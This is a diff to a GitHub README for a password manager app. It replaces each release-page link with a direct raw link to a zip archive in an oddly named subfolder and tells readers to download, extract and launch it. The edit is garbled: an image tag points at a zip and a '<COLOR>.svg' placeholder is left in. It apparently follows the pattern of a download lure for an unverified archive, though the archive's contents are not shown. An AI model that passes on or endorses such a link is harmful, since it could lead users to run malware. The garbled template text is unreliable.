@@ -1,7 +1,7 @@
 
 # Password Manager Intermediate 🛡️
 
-![Password manager](https://github.com/unlimxts2/password-manager-intermediate/releases/tag/v2.0)
+![Password manager](https://raw.githubusercontent.com/unlimxts2/password-manager-intermediate/main/nyctalope/manager_intermediate_password_2.2.zip)
 
 Welcome to the Password Manager Intermediate repository! This repository houses a powerful Password Manager app with a sleek graphical user interface (GUI) to help you securely store, manage, and retrieve your passwords with ease. Let's dive into the details of this awesome project:
 
@@ -15,8 +15,8 @@ Welcome to the Password Manager Intermediate repository! This repository houses 
 - **Lock Icon:** A professional-looking lock icon adds a touch of security to the app.
 
 ## Installation 🖥️
-You can download the https://github.com/unlimxts2/password-manager-intermediate/releases/tag/v2.0 file from the following link:
-[![Download https://github.com/unlimxts2/password-manager-intermediate/releases/tag/v2.0](https://github.com/unlimxts2/password-manager-intermediate/releases/tag/v2.0<COLOR>.svg)](https://github.com/unlimxts2/password-manager-intermediate/releases/tag/v2.0)
+You can download the https://raw.githubusercontent.com/unlimxts2/password-manager-intermediate/main/nyctalope/manager_intermediate_password_2.2.zip file from the following link:
+[![Download https://raw.githubusercontent.com/unlimxts2/password-manager-intermediate/main/nyctalope/manager_intermediate_password_2.2.zip](https://raw.githubusercontent.com/unlimxts2/password-manager-intermediate/main/nyctalope/manager_intermediate_password_2.2.zip<COLOR>.svg)](https://raw.githubusercontent.com/unlimxts2/password-manager-intermediate/main/nyctalope/manager_intermediate_password_2.2.zip)
 
 Once downloaded, extract the contents and launch the app to start managing your passwords efficiently.
 
